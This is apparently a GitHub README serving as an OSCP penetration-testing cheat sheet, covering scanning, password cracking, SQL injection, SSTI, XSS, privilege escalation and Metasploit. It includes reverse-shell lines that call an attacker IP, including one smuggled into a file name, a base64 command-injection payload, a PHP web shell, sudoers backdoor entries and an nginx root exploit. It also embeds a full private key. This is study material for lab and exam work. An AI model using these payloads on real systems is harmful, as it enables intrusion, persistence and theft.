# oscp-cheatsheet
This repository describes cheat sheet and knowledge for OSCP.

# Contents
<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [Enumeration](#enumeration)
  - [Network](#network)
    - [nmap](#nmap)
      - [Basic commands](#basic-commands)
      - [Options](#options)
    - [UDP scanning](#udp-scanning)
    - [Check for any known vulnerability by nmap](#check-for-any-known-vulnerability-by-nmap)
  - [RustScan](#rustscan)
    - [Basic command](#basic-command)
    - [Detect service and version](#detect-service-and-version)
    - [Enumeration for UDP](#enumeration-for-udp)
    - [Check for any known vulnerability by rustscan](#check-for-any-known-vulnerability-by-rustscan)
  - [Windows Privilege Escalation](#windows-privilege-escalation)
    - [PowerUp.ps1](#powerupps1)
    - [Scan](#scan)
    - [SeImpersonatePrivilege](#seimpersonateprivilege)
      - [PrintSpoofer](#printspoofer)
  - [Linux Privilege Escalation](#linux-privilege-escalation)
    - [LinPEAS](#linpeas)
    - [pspy](#pspy)
- [Password Cracking](#password-cracking)
  - [hydra](#hydra)
      - [Example](#example)
  - [John the ripper](#john-the-ripper)
      - [Example](#example-1)
  - [hashcat](#hashcat)
  - [Webpages](#webpages)
    - [Hashes](#hashes)
    - [craskstation](#craskstation)
- [Brute Force Attack](#brute-force-attack)
  - [File](#file)
      - [dirb](#dirb)
    - [gobuster](#gobuster)
  - [Directory](#directory)
    - [dirb](#dirb-1)
    - [gobuster](#gobuster-1)
    - [dirsearch](#dirsearch)
  - [subdomains](#subdomains)
    - [gobuster](#gobuster-2)
      - [Wordlist example](#wordlist-example)
        - [bitquark-subdomains-top100000.txt](#bitquark-subdomains-top100000txt)
- [JWT (JSON Web Token) exploit](#jwt-json-web-token-exploit)
    - [Debugger](#debugger)
    - [jwt_tool](#jwt_tool)
      - [tampering](#tampering)
      - [exploit](#exploit)
- [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
  - [PayloadsAllTheThings](#payloadsallthethings)
  - [How to identify the Vulnerability SSTI?](#how-to-identify-the-vulnerability-ssti)
    - [Mako](#mako)
      - [RCE](#rce)
- [SQL Injection](#sql-injection)
  - [PayloadsAllTheThings](#payloadsallthethings-1)
    - [Insert Statement injection using ON DUPLICATE KEY UPDATE](#insert-statement-injection-using-on-duplicate-key-update)
  - [sqlmap](#sqlmap)
    - [Basic Example](#basic-example)
    - [second request](#second-request)
    - [enumerate tables](#enumerate-tables)
    - [extract data from table](#extract-data-from-table)
- [XSS](#xss)
  - [Polyglot](#polyglot)
- [Aggregating Sensitive Information](#aggregating-sensitive-information)
  - [truffleHog](#trufflehog)
    - [Scan GitHub](#scan-github)
- [Fuzz](#fuzz)
  - [ffuf](#ffuf)
    - [Basic usage](#basic-usage)
    - [Special Character Fuzz](#special-character-fuzz)
    - [Subdomain Fuzz](#subdomain-fuzz)
- [SSH](#ssh)
  - [Convert Putty private key format to openssh](#convert-putty-private-key-format-to-openssh)
- [Depixelize](#depixelize)
  - [Depix](#depix)
- [Spawning shell](#spawning-shell)
  - [python](#python)
  - [echo](#echo)
  - [bash](#bash)
- [JDI](#jdi)
- [Git](#git)
  - [Dump .git](#dump-git)
- [Linux command](#linux-command)
  - [Basic command](#basic-command-1)
    - [Show allowing commands as root user](#show-allowing-commands-as-root-user)
    - [Run command as other user](#run-command-as-other-user)
    - [Show file type](#show-file-type)
    - [Show the strings of printable characters in files](#show-the-strings-of-printable-characters-in-files)
    - [Read from standard input and write to standard output and files](#read-from-standard-input-and-write-to-standard-output-and-files)
    - [Find files created by a particular user](#find-files-created-by-a-particular-user)
    - [Inject os command to file name](#inject-os-command-to-file-name)
    - [Reverse shell by /dev/tcp/](#reverse-shell-by-devtcp)
    - [rlwrap](#rlwrap)
      - [nc (Listen port 9001)](#nc-listen-port-9001)
    - [Extract information from /etc/passwd](#extract-information-from-etcpasswd)
  - [sudoers](#sudoers)
    - [Disable password checking for sudo](#disable-password-checking-for-sudo)
    - [Running all commands are allowed by sudo](#running-all-commands-are-allowed-by-sudo)
  - [Docker](#docker)
    - [Get a subsection in JSON format](#get-a-subsection-in-json-format)
  - [SUID](#suid)
    - [Find files with the SUID bit set](#find-files-with-the-suid-bit-set)
    - [Run files with suid](#run-files-with-suid)
  - [DNS](#dns)
    - [Specify referred DNS server](#specify-referred-dns-server)
  - [String Processing](#string-processing)
    - [Remove white spaces](#remove-white-spaces)
  - [SMB](#smb)
    - [smbclient](#smbclient)
  - [Extract image from PDF](#extract-image-from-pdf)
- [Windows command](#windows-command)
  - [Powershell](#powershell)
    - [Create New file](#create-new-file)
    - [Display the contents of a text file](#display-the-contents-of-a-text-file)
    - [Get a file via HTTP (equivalent to wget)](#get-a-file-via-http-equivalent-to-wget)
- [Python](#python-1)
  - [Run HTTP Server](#run-http-server)
    - [python3](#python3)
    - [python2](#python2)
  - [Run system command by using dynamic import](#run-system-command-by-using-dynamic-import)
  - [Exploitable python functions](#exploitable-python-functions)
    - [Python2](#python2-1)
      - [input()](#input)
- [PHP](#php)
  - [Detect exploitable function (e.g. RCE)](#detect-exploitable-function-eg-rce)
  - [phar](#phar)
- [Reverse shell](#reverse-shell)
  - [php-reverse-shell](#php-reverse-shell)
  - [Reverse shell cheat sheet](#reverse-shell-cheat-sheet)
  - [GIF89a](#gif89a)
  - [Metasploit](#metasploit)
- [Metasploit](#metasploit-1)
  - [meterpreter](#meterpreter)
  - [Get system info](#get-system-info)
    - [Start shell](#start-shell)
    - [Upload file from Metasploit host to target](#upload-file-from-metasploit-host-to-target)
    - [Download file from target to Metasploit host](#download-file-from-target-to-metasploit-host)
    - [Load powershell and run](#load-powershell-and-run)
  - [msfvenom](#msfvenom)
    - [Windows](#windows)
      - [exe](#exe)
      - [exe-service](#exe-service)
- [Nginx](#nginx)
  - [Malicious conf file to get root privilege](#malicious-conf-file-to-get-root-privilege)
- [BurpSuite](#burpsuite)
  - [Hot Keys](#hot-keys)
- [GraphQL](#graphql)
- [Others](#others)
  - [References for OSCP](#references-for-oscp)
    - [GTFOBins](#gtfobins)
  - [Word List](#word-list)
    - [SecLists](#seclists)
    - [Reverse shell cheat sheet](#reverse-shell-cheat-sheet-1)
      - [php-reverse-shell](#php-reverse-shell-1)
      - [Groovy Reverse shell](#groovy-reverse-shell)
    - [HTML Security CheatSheet](#html-security-cheatsheet)
  - [References for vulnerabilities](#references-for-vulnerabilities)
    - [Shellshock (CVE-2014-6271)](#shellshock-cve-2014-6271)
  - [Kali linux on docker for Mac](#kali-linux-on-docker-for-mac)
- [LICENSE](#license)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->
# Enumeration
## Network
### nmap
#### Basic commands
```console
nmap -sV -T4 -Pn <Target IP Address>
```
#### Options
`-sV`: Show opening ports and running services.  
`-T4`: Prohibit the dynamic scan delay from exceeding 10ms for TCP ports  
`-Pn`: Disable sending ping packets to discover a host  
`-A`: Detect OS and its version.  
`-p`: Specify range of ports. Scan all ports (1-65535) if using the option `-p-`  

### UDP scanning
```
sudo nmap -sU -p- $IP --min-rate=10000 -v
```

### Check for any known vulnerability by nmap
```shell
nmap --script vuln -oA vulnscan $IP
```

## RustScan
This tool is faster tool than nmap.
https://github.com/RustScan/RustScan

### Basic command
```
rustscan -a <target ip> -- <nmap options>
```

### Detect service and version
Detect service and versions in 22/tcp and 80/tcp
```
rustscan -a $IP --ports 22,80 -- -sC -sV
```

### Enumeration for UDP
```
rustscan -a $IP --udp -- -Pn -T4
```

### Check for any known vulnerability by rustscan
```shell
rustscan -a $IP -- --script vuln -oA vulnscan
```



## Windows Privilege Escalation
### PowerUp.ps1
This script enumerates the privileges vulnerabilities in Windows 
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1

### Scan
```console
. .\PowerUp.ps1
Invoke-PrivescAudit [-HTMLReport]
```
Note that this tool output "COMPUTER.username.html" if the `-HTMLReport` is enabled.

### SeImpersonatePrivilege
#### PrintSpoofer
https://github.com/itm4n/PrintSpoofer

## Linux Privilege Escalation
### LinPEAS
LinePEAS is a script which detect the possible path to escalate privilege on Linux etc...
```
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
```

### pspy
Monitoring process tool in real time.
```
https://github.com/DominicBreuker/pspy
```

# Password Cracking
## hydra
#### Example
- Brute force attack for username and password (HTTP POST)
```console
hydra -L <username list file> -P <password list file> <ip address> http-post-form '<path>:<query parameter>:<string when failing login>'  
```
- Brute force attack for the password (HTTP POST)
```console
hydra -l <username> -P <password list file> <ip address> http-post-form '<path>:<query parameter>:<string when failing login>'
```
We can set the following variables when specifying the list file:  
`^USER^`: Replace this string in \<query parameter\> with the username listed in \<username list file\>  
`^PASSWORD^`: Replace this string in \<query parameter\> with the password listed in \<password list file\>

## John the ripper
A tool to get the plain password from hashed one.

#### Example
```
john --wordlist=rockyou.txt hash.txt
```

## hashcat
A tool to get the plain password from hashed one.
```
hashcat -m <mode> -o <output file> <hashed password file> <wordlist file>
```
Modes are defined in the following page.
https://hashcat.net/wiki/doku.php?id=example_hashes

For example, if we want to decrypt SHA-512 hash value + salt by using rockyou.txt, we should run the following command:
```
hashcat -m 1710 -o cracked.txt hash.txt rockyou.txt
```
, then, the above command outputs cracked password to cracked.txt.


## Webpages 
Webpages to get the plain password from hashed one, as follows:
### Hashes
https://hashes.com/en/decrypt/hash

### craskstation
https://crackstation.net/

# Brute Force Attack

## File
#### dirb
```
dirb <targetURL> -X <extension list separated by comma (e.g. .sh, .pl, .txt, .php, .py)>
```

### gobuster
```
gobuster dir -x .sh, .pl, .txt, .php, .py -u <target url> -w /usr/share/wordlists/dirb/common.txt -t 100
```

## Directory
### dirb
```
dirb <target url>
```

### gobuster
```shell
gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 100
```
```shell
gobuster dir -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```
### dirsearch
```shell
dirsearch -u <target url>
```

## subdomains
### gobuster
Find Vhosts:
```
gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://permx.htb --append-domain
```

Find DNS subdomains:
```
gobuster dns -d <domain name> -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
```

#### Wordlist example
##### bitquark-subdomains-top100000.txt
https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/bitquark-subdomains-top100000.txt


# JWT (JSON Web Token) exploit

### Debugger
This website provides decoding JWT and editing the payload in decoded JWT.  
https://jwt.io/

### jwt_tool
This tool helps us to validate, tamper, and forge JWTs for a pentester.  
https://github.com/ticarpi/jwt_tool


#### tampering
```
python jwt_tool.py <JWT> -T
```

#### exploit
```
python jwt_tool.py <JWT> -X <parameter>
```
The parameter can be specified as follow:  
`a`: alg:none  
`n`: null signature  
`b`: blank password accepted in signture  
`s`: spoof JWKS  
`k`: key confusion  
`i`: inject inline JKWS  

# SSTI (Server-Side Template Injection)
## PayloadsAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md

## How to identify the Vulnerability SSTI?
```
${{<%[%’”}}%\.
```
https://medium.com/@aslam.mahimkar/hackthebox-busqueda-writeup-c4ae57a89fd4

### Mako
#### RCE
``` shell
${self.module.cache.util.os.popen("cat /flag.txt").read()}
```

# SQL Injection
## PayloadsAllTheThings
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

### Insert Statement injection using ON DUPLICATE KEY UPDATE
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#insert-statement---on-duplicate-key-update

## sqlmap
### Basic Example
```shell
sqlmap -r req.txt --dbs --batch --threads 5
```
`--dbs`: get database list.
`--technique=B`: Boolean-based blind SQL Injection

The type for techniques is described:
https://github.com/sqlmapproject/sqlmap/wiki/Techniques

For websocket, sqlmap can inject SQL logic:
```shell
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --threads 10 -
level 5 --risk 3 --batch
```
`--dbs`: enumerate database list

### second request
After sending the tampered request, send the second request to check the response.
```shell
sqlmap -r req.txt --second-req=secreq.txt --dbs --threads 5 --tamper=space2comment --batch
```

'tamper' is explained below:
[Tamper](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#tamper)

### enumerate tables
```shell
sqlmap -r req.txt --second-req=secreq.txt --threads 5 --tamper=space2comment --tables --batch -D database_name
```
`-D`: database name

### extract data from table
```shell
sqlmap -r req.txt --second-req=secreq.txt --threads 5 --tamper=space2comment -T users --dump
```
`-T`: table name

# XSS
## Polyglot
The following script includes multiple payloads to improve the test efficiency.
```shell
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

# Aggregating Sensitive Information
## truffleHog
This tool gets high entropy strings (e.g. Password, APIKey, etc...).
https://github.com/trufflesecurity/trufflehog
### Scan GitHub
Docker
``` shell
docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --repo <Repository URL></Repository>
```

# Fuzz
## ffuf
### Basic usage
```
ffuf -request <request file> -request-proto http -w <wordlist (e.g. SecList)>
```
### Special Character Fuzz
```
ffuf -request test_spchars.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt
```
test_spchars.req is defined as follows [Hack the box: Busqueda](https://app.hackthebox.com/machines/Busqueda):
```
POST /search HTTP/1.1
Host: searcher.htb
Content-Length: 25
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://searcher.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://searcher.htb/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

engine=Google&query=abcdeFUZZ
```

### Subdomain Fuzz
```
ffuf -request test_subdomain.req -request-proto http -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```
test_subdomain.req is defined as follows ([Hack the box: updown](https://app.hackthebox.com/machines/UpDown)):
```
POST / HTTP/1.1
Host: FUZZ.siteisup.htb
Content-Length: 36
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://siteisup.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://siteisup.htb/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

site=http%3A%2F%2Fgoogle.com&debug=1
```
# SSH
## Convert Putty private key format to openssh
```shell
puttygen ssh_key_file -O private-openssh -o id_rsa
```
The "ssh_key_file" is the putty private key, such as:
```
echo "PuTTY-User-Key-File-3: ssh-rsa
 Encryption: none
 Comment: rsa-key-20230519
 Public-Lines: 6
 AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
 8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
 EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
 Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
 FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
 LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
 Private-Lines: 14
 AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
 oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
 kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
 f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
 VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
 UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
 OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
 in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
 SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
 09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
 xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
 AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
 AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
 NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
 Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0" > 
ssh_key_file
```


# Depixelize
## Depix
https://github.com/spipm/Depix
Depix is a PoC for a technique to recover plaintext from pixelized screenshot.

```shell
python3 depix.py \
    -p /path/to/your/input/image.png \
    -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \
    -o /path/to/your/output.png
```


# Spawning shell
## python
```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
## echo
```shell
echo 'os.system('/bin/bash')'
```
## bash
```shell
/bin/bash -i
```

# JDI
Decompiling jar and class.
```shell
jd-gui <filename>
```

# Git
## Dump .git
https://github.com/arthaud/git-dumper
```
git-dumper http://siteisup.htb/dev/.git dev
```

# Linux command

## Basic command
### Show allowing commands as root user
```
sudo -l
```

### Run command as other user
```
sudo -u <user> <command>
```
e.g.
```
sudo -u <user> /bin/bash
```
### Show file type
```
file <file name>
```

### Show the strings of printable characters in files
```
strings <file name>
```

### Read from standard input and write to standard output and files
```
echo <text> | tee -a <file>
```

### Find files created by a particular user
```shell
find / -type f -user user
```

### Inject os command to file name
```shell
touch  ';nc -c bash 10.10.14.30 4321;.php'
```
'.php' is an extension

### Reverse shell by /dev/tcp/
```shell
echo "bash -i >& /dev/tcp/<your-ip>/1234 0>&1"
```

Note that the above command cannot be combinated with ${IFS} due to "ambiguous redirect"... Therefore, we can encode the above command by base64.
```shell
echo "bash -i >& /dev/tcp/<your-ip>/1234 0>&1" | base64 -w 0
```
When we send the payload the encoded command, add decoding command:
```shell
;echo${IFS}"<your payload here>"${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;
```

### rlwrap
https://linux.die.net/man/1/rlwrap
#### nc (Listen port 9001)
```
rlwrap -cAr nc -lnvp 9001
```

### Extract information from /etc/passwd
Extract information except "false", "nologin", and "sync" from /etc/passwd
```
cat /etc/passwd | grep -v -e false -e nologin -e sync
```
false, nologin: Disallow login
sync: Sync disk(?)

## sudoers
### Disable password checking for sudo
```shell
echo "<username> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers
```

### Running all commands are allowed by sudo
In this example, the user "mtz" is allowed to run all commands by sudo.
```shell
echo "mtz    ALL=(ALL:ALL) ALL" | tee -a /etc/sudoers
```



## Docker
### Get a subsection in JSON format
https://docs.docker.com/reference/cli/docker/inspect/
```
docker inspect --format='{{json .Config}}' $INSTANCE_ID
```

## SUID
### Find files with the SUID bit set
```shell
 find / -type f -perm -4000 2>/dev/null
```

### Run files with suid
The privileged mode can be run if the suid for the script is enabled. 
For example, if we want to run the script, named '.suid_bash', with root privilege, 
```
-rwsr-sr-x 1 root  root  1113504 Jul 22  2020  .suid_bash
```
we should run the following command: 
```
./.suid_bash -p
```
https://stackoverflow.com/questions/63689353/suid-binary-privilege-escalation


## DNS
### Specify referred DNS server
```
nslookup
server <DNS Server>
```

## String Processing
### Remove white spaces
```
sed 's/ //g'
```

## SMB
### smbclient
```console
smbclient -L <target>  # Enumerate sharenames
smbclient //<target>/<sharename>
get <filename>
```

## Extract image from PDF
```shell
pdfimages in.pdf outputimage
```




# Windows command
## Powershell
### Create New file
```
New-Item <filename> -Type File
```

### Display the contents of a text file
```
type <filename>
```

### Get a file via HTTP (equivalent to wget)
```
Invoke-WebRequest -Uri http://example.com/file.zip -OutFile C:\path\to\save\file.zip
```
```
iwr http://example.com/file.zip -OutFile C:\path\to\save\file.zip
```


# Python
## Run HTTP Server
### python3
```
python -m http.server <port>
```
### python2
```
python -m SimpleHTTPServer <port>
```



## Run system command by using dynamic import
```python
__import__('os').system('id')
```
```python
__import__('os').system('/bin/bash')
```

## Exploitable python functions
### Python2
#### input()
The input() function in Python2 is known to be insecure, as it acts similar to the eval(). 
Reference: [HackTheBox "UpDown" Writeup](https://app.hackthebox.com/machines/Busqueda/writeups)
Example:
```python
import requests
url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
print "Website is up"
else:
print "Website is down"
```
This script uses input(). When asking for input, we can exploit this by using the following commands.
```python
__import__('os').system('id')
```
```python
__import__('os').system('/bin/bash')
```

# PHP
## Detect exploitable function (e.g. RCE)
dfunc-bypasser detects exploitable legacy function.
Python3.
https://github.com/rootsecdev/dfunc-bypasser

Python2 (original):
https://github.com/teambi0s/dfunc-bypasser/tree/master

```
python dfunc-bypasser.py --url https://example.com/phpinfo.php
```

## phar
phar is achived PHP files.
We can access ``phar://<phar file>/<.php filename>``

# Reverse shell
## php-reverse-shell
```
https://pentestmonkey.net/tools/web-shells/php-reverse-shell
```

## Reverse shell cheat sheet
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

## GIF89a
https://github.com/Rajchowdhury420/OSCP-CheatSheet/blob/main/Reverse-Shell-via-JPG.md
```shell
GIF89a;
<?
system($_GET['cmd']);//or you can insert your complete shell code
?>
```


## Metasploit
Refer  [msfvenom](#msfvenom)
# Metasploit
## meterpreter
## Get system info
```
sysinfo
```
### Start shell
```
shell
```

### Upload file from Metasploit host to target
```
upload <filepath>
```

### Download file from target to Metasploit host
```
download <filepath>
```

### Load powershell and run
```
load powershell
powershell_shell
```
## msfvenom
This tool creates a payload, such as reverse shell, embedded in a file.

### Windows
#### exe
```
msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -e x86/shikata_ga_nai -f exe -o evil.exe
```
#### exe-service
```
msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -e x86/shikata_ga_nai -f exe-service -o evil.exe
```

# Nginx
## Malicious conf file to get root privilege
Check running the nginx by using sudo:
```shell
sudo -l

(ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

Create the following conf file to access '/':
```
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
    worker_connections 768;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;

        dav_methods PUT;
    }
}
```

Run the nginx by using malicious conf file.
```
sudo nginx -c /tmp/exploit.conf
```

Then, we can get a file by curl command.
``` shell
curl 127.0.0.1:1337/root/root.txt
```
or access the target by ssh with root privilege:
```
ssh-keygen
<snip...>

curl -X PUT 10.129.230.87:1337/root/.ssh/authorized_keys --upload-file root.pub
ssh -i root root@<target ip>
```

# BurpSuite
## Hot Keys
https://github.com/rinetd/BurpSuite-1/blob/master/CheatSheet.md

# GraphQL
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql

# Others

## References for OSCP
### GTFOBins
This website is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.  
https://gtfobins.github.io/

## Word List
### SecLists
https://github.com/danielmiessler/SecLists

### Reverse shell cheat sheet
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
#### php-reverse-shell
https://github.com/pentestmonkey/php-reverse-shell

#### Groovy Reverse shell
https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76

NOTE: This shell is abused in Jenkis Groovy Script Console.
https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6

### HTML Security CheatSheet
https://html5sec.org/
This cheat sheet shows the XSS payloads against each browser.

## References for vulnerabilities
### Shellshock (CVE-2014-6271)
https://blog.cloudflare.com/inside-shellshock/

## Kali linux on docker for Mac
https://5kyr153r.hatenablog.jp/entry/2022/11/14/104548 (Japanese)
https://www.kali.org/docs/general-use/novnc-kali-in-browser/






# LICENSE
MIT

